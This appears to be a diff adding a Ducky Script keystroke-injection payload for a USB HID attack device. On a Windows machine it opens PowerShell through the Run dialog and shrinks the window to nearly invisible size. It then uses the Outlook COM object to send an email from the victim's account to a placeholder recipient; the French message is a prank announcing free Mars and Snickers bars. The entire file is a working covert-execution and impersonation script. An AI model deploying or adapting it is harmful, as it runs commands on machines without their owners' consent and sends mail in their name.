@@ -1,0 +1,32 @@
+DELAY 750
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 1000
+STRING $pshost = Get-Host
+ENTER
+STRING $psWindow = $pshost.UI.RawUI
+ENTER
+STRING $newSize = $psWindow.WindowSize
+ENTER
+STRING $newSize.Height = 3
+ENTER
+STRING $newSize.Width = 3
+ENTER
+STRING $psWindow.WindowSize= $newSize
+ENTER
+STRING $Outlook = New-Object -ComObject Outlook.Application
+ENTER
+STRING $Mail = $Outlook.CreateItem("olMailItem")
+ENTER
+STRING $Mail.To = "recipient@here.com"
+ENTER
+STRING $Mail.Subject = "Surprise surprenante"
+ENTER
+STRING $Mail.Body ="Selon votre demande, cher peuple, va pour les Mars ET les Snickers cet aprem. --Florian le TRES genereux."
+ENTER
+STRING $Mail.Send()
+ENTER
+STRING exit
+ENTER
